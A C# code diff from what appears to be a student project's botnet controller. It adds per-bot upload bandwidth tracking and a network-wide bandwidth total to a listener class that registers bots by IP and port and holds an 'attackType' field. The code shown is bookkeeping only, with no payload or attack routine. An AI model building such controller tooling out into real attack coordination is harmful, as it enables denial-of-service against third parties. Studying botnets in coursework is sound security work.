@@ -30,9 +30,10 @@ namespace Coms4507_Project.BotHandling
         public string attackType{ get; set; }
         public string requestType = "status";
 
-        public Dictionary<string, string> botIpPortDetails;
-        private Dictionary<string, long> botIdUnixTimestamp;
-
+        public Dictionary<string, string> botIpPortDetails; // botID -> ip::port
+        private Dictionary<string, long> botIdUnixTimestamp; // botID -> UNIX Epoch Timestamp (last request)
+        private Dictionary<string, float> botIdBandwidth; // botID -> upload speed (message["bandwidth"])
+        private float totalBandwidth;
         public List<string> outputList;
         public int botExceptionsThrown = 0;
 
@@ -45,7 +46,14 @@ namespace Coms4507_Project.BotHandling
             thread.Start();
             botIpPortDetails = new Dictionary<string, string>();
             botIdUnixTimestamp = new Dictionary<string, long>();
+            botIdBandwidth = new Dictionary<string, float>();
+            totalBandwidth = 0;
             attackType = "none";
+        }
+
+        public float GetTotalBandwidth()
+        {
+            return totalBandwidth;
         }
 
         private void Listener()
@@ -88,6 +96,17 @@ namespace Coms4507_Project.BotHandling
 
                     // this is where the bots are assigned their IDs. It will be reassigned whenever a new IP is created.
                     botIpPortDetails[hostID] = ip + "::" + port;
+                    if (jData.GetValue("bandwidth") != null)
+                    {
+                        float tempBandwidthVal = 0;
+                        botIdBandwidth[hostID] = float.Parse(jData.GetValue("bandwidth").ToString());
+                        // Updates the total bandwidth of the network.
+                        foreach (float upload in botIdBandwidth.Values.ToArray())
+                        {
+                            tempBandwidthVal += upload;
+                        }
+                        totalBandwidth = tempBandwidthVal; // Re-assign to then be called by the ViewModel
+                    }
                     botIdUnixTimestamp[hostID] = DateTimeOffset.Now.ToUnixTimeSeconds(); // Timestamp
                     Trace.WriteLine(botIpPortDetails.ToString());
                     /* 
